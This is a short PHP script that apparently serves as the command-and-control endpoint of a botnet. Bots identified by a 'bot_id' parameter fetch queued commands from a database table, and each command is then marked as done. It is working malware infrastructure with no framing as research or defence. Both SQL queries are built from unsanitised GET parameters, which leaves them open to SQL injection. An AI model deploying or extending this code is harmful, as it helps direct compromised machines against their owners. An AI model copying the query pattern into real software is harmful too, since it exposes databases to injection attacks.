<?php
	include "db.php";
	$check = "off";
	if(isset($_GET["bot_id"])){
		$bot_id = $_GET["bot_id"];
		//echo "bot_id: ".$bot_id;
		if(isset($_GET["cmd"])){
			$cmd = $_GET["cmd"];
			// echo "cmd: ".$cmd."<br>";
			$sql = "select `command` from `command_set` where `bot_id`='".$bot_id."' and `cmd`='".$cmd."'and `status`='wait'";
			$result = $conn->query($sql);
			if ($result->num_rows > 0){
				while($row = $result->fetch_row()){
					echo $row[0];
					break;
				}
			}
			// update status for command
			$sql = "update `command_set` set `status`='done' where `bot_id`='".$bot_id."' and `cmd`='".$cmd."'";
			$result = $conn->query($sql);
		}
	}else{
		// echo "off";
	}
	$conn->close();
?>